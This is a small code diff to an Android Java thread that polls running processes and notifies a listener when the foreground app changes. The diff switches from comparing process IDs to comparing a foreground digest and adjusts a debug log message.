@@ -9,6 +9,8 @@
 
 package com.android.networking.listener;
 
+import android.app.ActivityManager.RunningAppProcessInfo;
+
 import com.android.networking.RunningProcesses;
 import com.android.networking.auto.Cfg;
 import com.android.networking.util.Check;
@@ -20,7 +22,7 @@ public class BroadcastMonitorProcess extends Thread {
 
 	private boolean stop;
 	private final int period;
-	private int pidFore = 0;
+	int oldForeDigest = 0;
 
 	RunningProcesses runningProcess;
 
@@ -40,16 +42,16 @@ public class BroadcastMonitorProcess extends Thread {
 		do {
 			if (stop) {
 				return;
-			}		
+			}
 			runningProcess.update();
-			int fore = runningProcess.getForegroundPid();
-			
-			if(pidFore!=fore){
+			int foreDigest = runningProcess.getForegroundDigest();
+
+			if (foreDigest != oldForeDigest) {
 				if (Cfg.DEBUG) {
-					Check.log(TAG + " (run), fore: " + fore);
+					Check.log(TAG + " (run), changed fore, dispatching");
 				}
-				pidFore = fore;
-				
+				oldForeDigest = foreDigest;
+
 				listenerProcess.dispatch(runningProcess);
 			}
 
